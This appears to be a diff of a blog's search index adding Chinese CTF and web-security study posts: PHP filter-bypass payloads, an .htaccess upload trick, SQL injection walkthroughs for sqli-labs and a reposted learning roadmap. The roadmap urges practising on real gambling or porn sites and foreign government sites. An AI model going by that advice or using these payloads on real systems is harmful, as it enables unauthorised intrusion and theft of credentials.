@@ -4,6 +4,82 @@
   
   
   <entry>
+    <title>php绕过</title>
+    <link href="/2024/11/15/php%E7%BB%95%E8%BF%87/"/>
+    <url>/2024/11/15/php%E7%BB%95%E8%BF%87/</url>
+    
+    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>在php中，我们常常会遇到一些需要绕过的题目，本文来重新理解一下一些题目的解法和绕过的流程；</p><h2 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h2><p>在ping的过程中一些地方可以在后方利用;或者|直接进行命令执行，但这时便会遇到一些相关方面的waf也就是阻拦，我们需要绕过这些waf</p><h3 id="1-空格绕过"><a href="#1-空格绕过" class="headerlink" title="1. 空格绕过"></a>1. 空格绕过</h3><p>代替空格<br>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等</p><h2 id="无字母rec"><a href="#无字母rec" class="headerlink" title="无字母rec"></a>无字母rec</h2><p>在这里存在一个取反的问题，原因是隐藏字母、可还原性、URL 编码与二进制兼容性<br>取反是一种隐蔽技术，它将敏感字符转换为难以识别的形式，有效规避检测。而不取反会直接暴露敏感字符或使其更容易被解码检测。结合 urlencode() 等方法，按位取反可以提升绕过复杂度并增强隐匿性</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;system&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;ls /&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);  <span class="hljs-comment">// 使用 ~$a，按位取反操作</span><br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$b</span>);  <span class="hljs-comment">// 使用 ~$b，按位取反操作</span><br><span class="hljs-meta">?&gt;</span><br>payload=?wllm=(~%<span class="hljs-number">8</span>c%<span class="hljs-number">86</span>%<span class="hljs-number">8</span>c%<span class="hljs-number">8</span>b%<span class="hljs-number">9</span>a%<span class="hljs-number">92</span>)(~%<span class="hljs-number">9</span>C%<span class="hljs-number">9</span>E%<span class="hljs-number">8</span>B%DF%D0%<span class="hljs-number">99</span>%D5);<br></code></pre></td></tr></table></figure><h2 id="htaccess文件包含绕过"><a href="#htaccess文件包含绕过" class="headerlink" title=".htaccess文件包含绕过"></a>.htaccess文件包含绕过</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//仅匹配1.jpg，也可以适用全部文件，解析为php</span><br>&lt;<span class="hljs-title class_">FilesMatch</span> <span class="hljs-string">&quot;1.jpg&quot;</span>&gt;<br><span class="hljs-title class_">SetHandler</span> application/x-httpd-php<br>&lt;/<span class="hljs-title class_">FilesMatch</span>&gt;<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>网络</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>php</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>web安全流程</title>
+    <link href="/2024/11/15/web%E5%AE%89%E5%85%A8%E6%B5%81%E7%A8%8B/"/>
+    <url>/2024/11/15/web%E5%AE%89%E5%85%A8%E6%B5%81%E7%A8%8B/</url>
+    
+    <content type="html"><![CDATA[<p>作者：Ph0rse<br>链接：<a href="https://www.zhihu.com/question/267204109/answer/320502511">https://www.zhihu.com/question/267204109/answer/320502511</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p><p>一、前期一系列的练习平台，大部分都有题解，实在十几天弄不出来可以看看题解。<br>SQL注入：RedTiger’s Hackit<br>web:网络安全实验室|网络信息安全攻防学习平台<br>综合：[WeChall]<br>Challenges经典老平台：南京邮电大学网络攻防训练平台<br>综合性新平台：CTF - 练习平台<br>渗透：Penetration test lab<br>综合性黑客game：Game of Hacks<br>XCTF的训练平台：XCTF实训平台 | 登 录<br>I春秋的CTF复现平台：<a href="https://www.ichunqiu.com/racing/58837">https://www.ichunqiu.com/racing/58837</a><br>安恒的平台：登录 - 明御® 攻防实验室<br>一个综合的新平台，貌似里面二进制的题挺好：Jarvis OJ<br>一个高端平台，里面有一些硬件、云安全、内网渗透的题：Exploit Exercises<br>又一个高端平台，里面有一些Oracle、密码学之类的题目：Under the Wire<br>渗透练习平台：<a href="https://pentest.training/mockexams.php">https://pentest.training/mockexams.php</a><br>一个代码审计的平台（不是web方向，有很多都是C语言的审计，墙裂建议女装大佬来秒）：Websec<br>一个封装好的CTF平台：Vulnerable Docker VM - NotSoSecure<br>也是封装好的一些训练环境：Vulnerable By Design ~ VulnHub<br>PHP安全训练平台：PHP Security Advent Calendar 2017<br>一个国外的CTFwiki，质量好像一般:Forgotten Security’s CTF Wiki<br>一个和Metasploit配套的靶场—Metasploitable： <a href="http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip">http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip</a><br>CTF工具库： CTF资源库|CTF工具下载|CTF工具包|CTF工具集合<br>以上是我自己整理的内容，同时推荐其它大佬的资源整理贴<br>~个人总结-网络安全学习和CTF必不可少的一些网站 - ida0918的博客 - CSDN博客  </p><p>二、中期打一些有奖金的CTF比赛，一些优质的CTF比赛还是比较贴近实战的，比如17年的HCTFCTF时间表：<br>XCTF比赛的时间表：首页 - XCTF社区<br>大型比赛的时间表：All about CTF (Capture The Flag)<br>CTF指南：CTF Rank，你的CTF参赛指南<br>CTFwiki：墙裂推荐！CTF Wiki<br>2018年的CTF竞赛 2018·CTF·信息安全竞赛导航  </p><p>一些CTF大佬的博客：<br>Hackfun - | Secblog | Pentest | Auditing | Sectool | CTF Write-up<br>Go0s @ 老 锥<br>Swing’Blog 有恨无人省<br><a href="http://haojiawei.xyz/page/3/">http://haojiawei.xyz/page/3/</a><br>pcat - 博客园<br>Si1ence’s Blog - 雨一落，化开我眼中的冰，蔓延成河。<br>Medici.Yan’s Blog<br>Radiation’s blog<br><a href="http://l-team.org/">http://l-team.org/</a><br>Sebastian Neef - 0day.work<br><a href="https://www.jimwilbur.com/">https://www.jimwilbur.com/</a><br>M4x - 博客园<br>当然，也不要仅仅局限于CTF比赛，多用docker去复现一些CVE环境，自己玩玩儿，再跟着P神学一下代码审计，不要拿到别人网站源码还不知道怎么getshell~一些闭源的cms，很容易审出洞。</p><p>这里在推荐一下p神的一个项目，用docker-compose去一键复现漏洞环境。</p><p>vulhub&#x2F;vulhub首页 | 离别歌vulhub&#x2F;vulhub</p><p>三、后期那些刻意的环境已经满足不了你了，去实战吧<br>日常关注着漏洞预警：Exploits Database by Offensive Security<br>瞄准相关漏洞之后，用shodan去进行漏洞全球主机探测：Shodan Manual · GitBook<br>先知安全服务平台<br>漏洞银行(BUGBANK) 官方网站 | 全球领先的漏洞发现平台<br>补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC，库带计划 - 国内首个现金奖励漏洞平台<br>一些非法网站，比如黄网、赌博网站也可以用来练手，反正是它们也是违法的，但不要去谋取利益就好。<br>大陆政府的网站绝对不要碰。如果心痒痒就去搞国外zf的，因为他们的人也在搞咱们政府的练手。  </p><p>作者：Ph0rse<br>链接：<a href="https://www.zhihu.com/question/267204109/answer/320502511">https://www.zhihu.com/question/267204109/answer/320502511</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>owasp top10 十大常见漏洞</title>
+    <link href="/2024/11/15/web%E5%8D%81%E5%A4%A7%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"/>
+    <url>/2024/11/15/web%E5%8D%81%E5%A4%A7%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/</url>
+    
+    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>搞渗透，挖漏洞，应该了解这些知识基础，我现在对这些东西的理解还不是很清晰，特此来写这一篇文章，逆向方面的话，可能就会比较晚了，感觉reverse-wiki不知到什么时候才可以开张</p><p>OWASP（开放式Web应用程序安全项目）是一个开放的社区，由非营利组织 OWASP基金会支持的项目。对所有致力于改进应用程序安全的人士开放，旨在提高对应用程序安全性的认识。<br>其最具权威的就是“10项最严重的Web 应用程序安全风险列表” ，总结并更新Web应用程序中最可能、最常见、最危险的十大漏洞，是开发、测试、服务、咨询人员应知应会的知识。</p><h1 id="十大漏洞介绍"><a href="#十大漏洞介绍" class="headerlink" title="十大漏洞介绍"></a>十大漏洞介绍</h1><h2 id="注入漏洞"><a href="#注入漏洞" class="headerlink" title="注入漏洞"></a>注入漏洞</h2><p>注入漏洞是指攻击者通过在应用程序中注入恶意代码，从而获取对应用程序的控制权。常见的注入漏洞包括SQL、OS 命令、ORM、LDAP和表达式语言或者 OGNL 注入。攻击者可以利用这些漏洞来窃取数据、篡改数据、执行任意代码等。注入工具也有很多，这里要介绍下基于 python开发的 SQLmap，SQLmap 支持对 PostgreSql，MySQL，Access，MsSql Server 等数据库的自动化注入。是在检查SQL注入漏洞方面最得力的工具。</p><h2 id="失效的身份认证"><a href="#失效的身份认证" class="headerlink" title="失效的身份认证"></a>失效的身份认证</h2><p>失效的身份认证是指应用程序在身份认证过程中存在缺陷，攻击者可以通过绕过身份认证机制来访问受保护的资源。常见的失效的身份认证漏洞包括弱密码、默认密码、暴力破解、会话劫持、会话固定、不安全的密码存储等。攻击者可以利用这些漏洞来冒充合法用户，窃取用户凭证，或者获取对受保护资源的未授权访问。</p><h2 id="敏感数据泄露"><a href="#敏感数据泄露" class="headerlink" title="敏感数据泄露"></a>敏感数据泄露</h2><p>敏感数据泄露是指应用程序在处理敏感数据时存在缺陷，导致敏感数据被泄露。应用维护或者开发人员无意间上传敏感数据，如 github 文件泄露。敏感数据文件的权限设置错误，如网站目录下的数据库备份文件泄露。网络协议、算法本身的弱点，如 telent、ftp、md5 等 常见的敏感数据泄露漏洞包括不安全的存储、不安全的传输、不安全的日志记录等。攻击者可以利用这些漏洞来窃取用户的个人信息、财务信息、商业机密等。在处理敏感数据时，应该使用加密、访问控制、安全传输等技术来保护数据的安全性。</p><h2 id="XML外部实体注入（XXE）"><a href="#XML外部实体注入（XXE）" class="headerlink" title="XML外部实体注入（XXE）"></a>XML外部实体注入（XXE）</h2><p>XML外部实体注入（XXE）是指攻击者通过在应用程序中注入恶意的XML实体，从而获取对应用程序的控制权。常见的XXE漏洞包括不安全的XML解析器、不安全的XML配置、不安全的XML库等。攻击者可以利用这些漏洞来窃取数据、执行任意代码等。在处理XML数据时，应该使用安全的XML解析器、配置和库，并禁用外部实体解析。</p><h2 id="无效的访问控制"><a href="#无效的访问控制" class="headerlink" title="无效的访问控制"></a>无效的访问控制</h2><p>无效的访问控制是指应用程序在访问控制过程中存在缺陷，导致未授权用户可以访问受保护的资源。常见的无效的访问控制漏洞包括不正确的权限检查、不正确的角色检查、不正确的访问控制策略等。攻击者可以利用这些漏洞来访问受保护的资源，窃取数据、篡改数据等。在实现访问控制时，应该使用严格的权限检查、角色检查和访问控制策略，并确保只有授权用户才能访问受保护的资源。<br>绕过路径，如未读取的参数做检查，导致路径绕过读取到敏感文件<br>权限提升，如未对权限做检查，导致攻击者变更权限<br>垂直越权，攻击者可以从普通的用户权限提升到管理员的权限访问应用程序<br>水平越权，攻击者可以从普通用户A的权限提升到普通用户B的权限访问应用程序</p><h2 id="安全配置错误"><a href="#安全配置错误" class="headerlink" title="安全配置错误"></a>安全配置错误</h2><p>安全配置错误是指应用程序在配置过程中存在缺陷，导致应用程序存在安全风险。常见的安全配置错误漏洞包括不安全的默认配置、不安全的配置文件、不安全的配置参数等。攻击者可以利用这些漏洞来获取对应用程序的控制权，窃取数据、执行任意代码等。在配置应用程序时，应该使用安全的默认配置、配置文件和配置参数，并定期检查和更新配置。</p><h2 id="跨站脚本（XSS）"><a href="#跨站脚本（XSS）" class="headerlink" title="跨站脚本（XSS）"></a>跨站脚本（XSS）</h2><p>跨站脚本（XSS）是指攻击者通过在应用程序中注入恶意脚本，从而获取对应用程序的控制权。常见的XSS漏洞包括反射型XSS、存储型XSS、DOM型XSS等。攻击者可以利用这些漏洞来窃取用户的个人信息、会话信息、执行恶意代码等。在处理用户输入时，应该使用安全的编码和过滤技术，并确保只有授权用户才能访问受保护的资源。</p><h2 id="不安全的反序列化"><a href="#不安全的反序列化" class="headerlink" title="不安全的反序列化"></a>不安全的反序列化</h2><p>不安全的反序列化是指应用程序在反序列化过程中存在缺陷，导致恶意数据被反序列化为对象，从而获取对应用程序的控制权。常见的反序列化漏洞包括不安全的反序列化库、不安全的反序列化配置等。攻击者可以利用这些漏洞来执行任意代码、窃取数据等。在反序列化数据时，应该使用安全的反序列化库和配置，并确保只有授权用户才能反序列化数据。</p><h2 id="使用含有已知漏洞的组件"><a href="#使用含有已知漏洞的组件" class="headerlink" title="使用含有已知漏洞的组件"></a>使用含有已知漏洞的组件</h2><p>使用含有已知漏洞的组件是指应用程序在开发过程中使用了含有已知漏洞的组件，导致应用程序存在安全风险。常见的使用含有已知漏洞的组件漏洞包括使用含有已知漏洞的库、框架、插件等。攻击者可以利用这些漏洞来获取对应用程序的控制权，窃取数据、执行任意代码等。在开发应用程序时，应该使用安全的组件，并及时更新和修补含有已知漏洞的组件。</p><h2 id="不足的日志记录和监控"><a href="#不足的日志记录和监控" class="headerlink" title="不足的日志记录和监控"></a>不足的日志记录和监控</h2><p>不足的日志记录和监控是指应用程序在日志记录和监控过程中存在缺陷，导致无法及时发现和响应安全事件。常见的不足的日志记录和监控漏洞包括不完整的日志记录、不充分的日志监控、不及时的日志响应等。攻击者可以利用这些漏洞来隐藏攻击行为、绕过安全机制等。在日志记录和监控过程中，应该使用完整的日志记录、充分的日志监控和及时的日志响应，并确保安全事件能够被及时发现和响应。</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>网络</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>熊猫烧香分析</title>
+    <link href="/2024/11/15/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/"/>
+    <url>/2024/11/15/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E5%88%86%E6%9E%90/</url>
+    
+    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本来打算搞个奶龙烧香的但是今天不是很想搞先弄弄web的几个大点，明天再来看看能不能复现一下，现在的电脑安全都太高了，熊猫烧香直接要么被杀要么就是不符合系统，有点麻烦</p>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>pip下载</title>
     <link href="/2024/11/07/pip%E4%B8%8B%E8%BD%BD/"/>
     <url>/2024/11/07/pip%E4%B8%8B%E8%BD%BD/</url>
@@ -205,6 +281,31 @@
   
   
   <entry>
+    <title>od脱壳脚本的使用与编写</title>
+    <link href="/2024/10/29/od%E8%84%B1%E5%A3%B3%E8%84%9A%E6%9C%AC%E7%9A%84%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%BC%96%E5%86%99/"/>
+    <url>/2024/10/29/od%E8%84%B1%E5%A3%B3%E8%84%9A%E6%9C%AC%E7%9A%84%E4%BD%BF%E7%94%A8%E4%B8%8E%E7%BC%96%E5%86%99/</url>
+    
+    <content type="html"><![CDATA[<h1 id="od脱壳脚本的使用与编写"><a href="#od脱壳脚本的使用与编写" class="headerlink" title="od脱壳脚本的使用与编写"></a>od脱壳脚本的使用与编写</h1><p>我们的软件取自<a href="https://www.52pojie.cn/thread-422100-1-1.html">52破解</a><br>第一步查壳，并且丢到idapro中看看有什么<br><img src="https://gitee.com/fogpost/photo/raw/master/202410292248198.png" srcset="/img/loading.gif" lazyload><br>可见这个软件是由tElock压缩过的<br><img src="https://gitee.com/fogpost/photo/raw/master/202410292249831.png" srcset="/img/loading.gif" lazyload><br>Idapro也是不负众望的啥也没扫出来，我们od加载一下，这里注意看一下内存加载，基地址是400000，这代表了我们关闭了ALSR这点对我们后面的脱壳很重要<br><img src="https://gitee.com/fogpost/photo/raw/master/202410292251590.png" srcset="/img/loading.gif" lazyload><br>在单步运行到这里时，我们程序会直接跑飞<br><img src="https://gitee.com/fogpost/photo/raw/master/202410292253699.png" srcset="/img/loading.gif" lazyload><br>下断点键入后，逐步步过，发现出现下面这个弹窗，表示本程序是有程序自校验，这里有两个方法，一是找到自校验方式nop掉，二是在每次键入时将断点取消，这也是一个好习惯<br><img src="https://gitee.com/fogpost/photo/raw/master/202410292254330.png" srcset="/img/loading.gif" lazyload><br>看下图发现，此程序还有对调试器的检测，我们这里开启了od的内核插件，但是好像在win10不起作用，没有防止检测，可以选择用win7，来加载<br><img src="https://gitee.com/fogpost/photo/raw/master/202410292303768.png" srcset="/img/loading.gif" lazyload><br>我们重新加载文件，在此处发现对od检测的jmp函数我们将这个函数进行nop即可正常进入软件<br><img src="https://gitee.com/fogpost/photo/raw/master/202410292321969.png" srcset="/img/loading.gif" lazyload><br>如果刚刚没有nop那么我们在下面这个图便会跳转到exitprocess进程结束<br><img src="https://gitee.com/fogpost/photo/raw/master/202410292321971.png" srcset="/img/loading.gif" lazyload></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>逆向</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>reverse</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>rc4</title>
     <link href="/2024/10/28/rc4/"/>
     <url>/2024/10/28/rc4/</url>
@@ -272,6 +373,31 @@
     <tags>
       
       <tag>tool</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>linux换源</title>
+    <link href="/2024/10/28/linux/"/>
+    <url>/2024/10/28/linux/</url>
+    
+    <content type="html"><![CDATA[<p>镜像省的搜</p><blockquote><p>sudo cp &#x2F;etc&#x2F;apt&#x2F;sources.list &#x2F;etc&#x2F;apt&#x2F;sources.list_backup</p></blockquote><blockquote><p>sudo gedit &#x2F;etc&#x2F;apt&#x2F;sources.list</p></blockquote><blockquote></blockquote><p>#deb <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib<br>#deb-src <a href="http://mirrors.ustc.edu.cn/kali">http://mirrors.ustc.edu.cn/kali</a> kali-rolling main non-free contrib</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>tool</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>linux</tag>
       
     </tags>
     
@@ -484,7 +610,7 @@
     <link href="/2024/10/06/sqli%E7%BB%83%E4%B9%A0/"/>
     <url>/2024/10/06/sqli%E7%BB%83%E4%B9%A0/</url>
     
-    <content type="html"><![CDATA[<h1 id="sqli开头简介"><a href="#sqli开头简介" class="headerlink" title="sqli开头简介"></a>sqli开头简介</h1><p>sql注入我们可以理解为，通过构造恶意的输入，从而让程序执行我们想要执行的代码。所以我们需要了解源代码中的sql注入是什么样的语句什么样的过滤，但是在黑盒中我们无法了解代码，这便需要我们去有足够的知识积累，所以我打算将这个靶场打完，我要做sql领域大神🥰！</p><h1 id="前置知识点"><a href="#前置知识点" class="headerlink" title="前置知识点"></a>前置知识点</h1><p>联合查询特点：<br>1、要求多条查询语句的查询列数是一致的！<br>2、要求多条查询语句的查询的每一列的类型和顺序最好一致<br>3、union关键字默认去重，如果使用union all 可以包含重复项  </p><p>version():查看数据库版本<br>database():查看使用的数据库<br>user():查看当前用户<br>limit:limit子句分批来获取所有数据<br>group_concat():一次性获取所有的数据库信息</p><p>information_schema.tables:包含了数据库里所有的表<br>table_name:表名<br>table_schema:数据库名<br>column_name:字段名</p><p>–dbs:是查看所有的数据库<br>–tables:是查看所有的表<br>–columns:是查看表中所有的字段名<br>–dump:是查询哪个表的数据</p><h1 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h1><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><ol><li>首先我们输入1，发现返回正常输入?id&#x3D;1’，返回错误，说明存在单引号注入<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060247359.png" srcset="/img/loading.gif" lazyload></li><li>输入?id&#x3D;1’ and ‘1’&#x3D;’1，页面回显正常<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060248949.png" srcset="/img/loading.gif" lazyload></li><li>构造?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 1–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 2–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 3–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 4–+　　出现报错界面<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060250107.png" srcset="/img/loading.gif" lazyload><br>所以我们了解到了数据库表只有三列，确定了字段数</li><li>构造联合查询?id&#x3D;-1’ union select 1,2,3–+前面的id为-1，使前面的语句无效，用union查询是否有回显，发现2和3有回显<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060254643.png" srcset="/img/loading.gif" lazyload></li><li>构造?id&#x3D;-1’ union select 1,database(),version()–+发现回显了数据库名称和版本信息<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060256922.png" srcset="/img/loading.gif" lazyload></li><li>构造?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()–+发现回显了数据库中的表名<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060259924.png" srcset="/img/loading.gif" lazyload></li><li>查询users的字段名?id&#x3D;-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;’users’–+<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060302469.png" srcset="/img/loading.gif" lazyload></li><li>查询users表中的内容-1’ union select 1,2,group_concat(0x5c,username,0x5c,password) from users –+ 0x5c是反斜杠的十六进制，用于连接这两个库的数据内容</li></ol><h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><ol><li>sqlmap -u <a href="http://sql/sqli-labs-master/Less-1/">http://sql/sqli-labs-master/Less-1/</a> –dbs 查看对应的库</li></ol><h1 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h1><h2 id="手工注入-1"><a href="#手工注入-1" class="headerlink" title="手工注入"></a>手工注入</h2><ol><li>输入?id&#x3D;1’，页面报错，说明存在单引号注入</li></ol>]]></content>
+    <content type="html"><![CDATA[<h1 id="sqli开头简介"><a href="#sqli开头简介" class="headerlink" title="sqli开头简介"></a>sqli开头简介</h1><p>sql注入我们可以理解为，通过构造恶意的输入，从而让程序执行我们想要执行的代码。所以我们需要了解源代码中的sql注入是什么样的语句什么样的过滤，但是在黑盒中我们无法了解代码，这便需要我们去有足够的知识积累，所以我打算将这个靶场打完，我要做sql领域大神🥰！</p><h1 id="前置知识点"><a href="#前置知识点" class="headerlink" title="前置知识点"></a>前置知识点</h1><p>联合查询特点：<br>1、要求多条查询语句的查询列数是一致的！<br>2、要求多条查询语句的查询的每一列的类型和顺序最好一致<br>3、union关键字默认去重，如果使用union all 可以包含重复项  </p><p>version():查看数据库版本<br>database():查看使用的数据库<br>user():查看当前用户<br>limit:limit子句分批来获取所有数据<br>group_concat():一次性获取所有的数据库信息</p><p>information_schema.tables:包含了数据库里所有的表<br>table_name:表名<br>table_schema:数据库名<br>column_name:字段名</p><p>–dbs:是查看所有的数据库<br>–tables:是查看所有的表<br>–columns:是查看表中所有的字段名<br>–dump:是查询哪个表的数据</p><h1 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h1><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><ol><li>首先我们输入1，发现返回正常输入?id&#x3D;1’，返回错误，说明存在单引号注入<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060247359.png" srcset="/img/loading.gif" lazyload></li><li>输入?id&#x3D;1’ and ‘1’&#x3D;’1，页面回显正常<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060248949.png" srcset="/img/loading.gif" lazyload></li><li>构造?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 1–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 2–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 3–+　　页面回显正常<br>?id&#x3D;1’ and ‘1’&#x3D;’1’ order by 4–+　　出现报错界面<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060250107.png" srcset="/img/loading.gif" lazyload><br>所以我们了解到了数据库表只有三列，确定了字段数</li><li>构造联合查询?id&#x3D;-1’ union select 1,2,3–+前面的id为-1，使前面的语句无效，用union查询是否有回显，发现2和3有回显<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060254643.png" srcset="/img/loading.gif" lazyload></li><li>构造?id&#x3D;-1’ union select 1,database(),version()–+发现回显了数据库名称和版本信息<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060256922.png" srcset="/img/loading.gif" lazyload></li><li>构造?id&#x3D;-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()–+发现回显了数据库中的表名<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060259924.png" srcset="/img/loading.gif" lazyload></li><li>查询users的字段名?id&#x3D;-1’ union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;’users’–+<br><img src="https://gitee.com/fogpost/photo/raw/master/202410060302469.png" srcset="/img/loading.gif" lazyload></li><li>查询users表中的内容-1’ union select 1,2,group_concat(0x5c,username,0x5c,password) from users –+ 0x5c是反斜杠的十六进制，用于连接这两个库的数据内容</li></ol><h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><ol><li>sqlmap -u <a href="http://sql/sqli-labs-master/Less-1/">http://sql/sqli-labs-master/Less-1/</a> –dbs 查看对应的库</li></ol><h1 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h1><p>?id&#x3D;1’and length((select database()))&gt;9–+<br>#大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4<br>?id&#x3D;1’and ascii(substr((select database()),1,1))&#x3D;115–+<br>#substr(“78909”,1,1)&#x3D;7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。</p><p>?id&#x3D;1’and length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&gt;13–+<br>判断所有表名字符长度。<br>?id&#x3D;1’and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;99–+<br>逐一判断表名</p><p>?id&#x3D;1’and length((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))&gt;20–+<br>判断所有字段名的长度<br>?id&#x3D;1’and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),1,1))&gt;99–+<br>逐一判断字段名。</p><p>?id&#x3D;1’ and length((select group_concat(username,password) from users))&gt;109–+<br>判断字段内容长度<br>?id&#x3D;1’ and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50–+<br>逐一检测内容。</p><h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>?id&#x3D;1’ and if(1&#x3D;1,sleep(5),1)–+<br>判断参数构造。<br>?id&#x3D;1’and if(length((select database()))&gt;9,sleep(5),1)–+<br>判断数据库名长度</p><p>?id&#x3D;1’and if(ascii(substr((select database()),1,1))&#x3D;115,sleep(5),1)–+<br>逐一判断数据库字符<br>?id&#x3D;1’and if(length((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))&gt;13,sleep(5),1)–+<br>判断所有表名长度</p><p>?id&#x3D;1’and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),1,1))&gt;99,sleep(5),1)–+<br>逐一判断表名<br>?id&#x3D;1’and if(length((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’))&gt;20,sleep(5),1)–+<br>判断所有字段名的长度</p><p>?id&#x3D;1’and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’),1,1))&gt;99,sleep(5),1)–+<br>逐一判断字段名。<br>?id&#x3D;1’ and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)–+<br>判断字段内容长度</p><p>?id&#x3D;1’ and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)–+<br>逐一检测内容。</p><h1 id="通过sql来getshell"><a href="#通过sql来getshell" class="headerlink" title="通过sql来getshell"></a>通过sql来getshell</h1><h2 id="条件和原理"><a href="#条件和原理" class="headerlink" title="条件和原理"></a>条件和原理</h2><blockquote><p>条件：<br> root权限<br> 